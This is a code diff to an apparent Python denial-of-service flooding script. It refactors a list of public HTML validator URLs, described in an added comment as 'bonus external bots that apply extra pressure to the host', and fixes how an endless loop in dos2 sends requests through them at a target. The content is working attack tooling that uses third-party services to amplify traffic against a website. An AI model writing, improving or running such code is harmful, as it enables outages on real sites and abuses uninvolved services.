@@ -37,13 +37,14 @@ def user_agent():
 	return(uagent)
 
 
-def my_bots():
-	global bots
-	bots=[]
-	bots.append("https://validator.w3.org/nu/?doc=http://")
-	bots.append("https://validator.w3.org/checklink?uri=http://")
-	bots.append("https://html5.validator.nu/?doc=http://")
-	return(bots)
+#Validators are used as bonus external bots that apply extra pressure to the host while trying to validate it
+def validators():
+	global vals
+	vals=[]
+	vals.append("https://validator.w3.org/nu/?doc=http://")
+	vals.append("https://validator.w3.org/checklink?uri=http://")
+	vals.append("https://html5.validator.nu/?doc=http://")
+	return(vals)
 
 
 def bot_rippering(url):
@@ -82,7 +83,7 @@ def dos():
 
 def dos2():
 	while True:
-		bot_rippering(random.choice(bots)+"http://"+host)
+		bot_rippering(random.choice(vals)+host)
 
 
 def usage():
@@ -137,10 +138,10 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[92m",host," port: ",str(port)," threads: ",str(thr),"\033[0m")
 	print("\033[94mPlease wait...\033[0m")
 	user_agent()
-	my_bots()
+	validators()
 	time.sleep(3)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
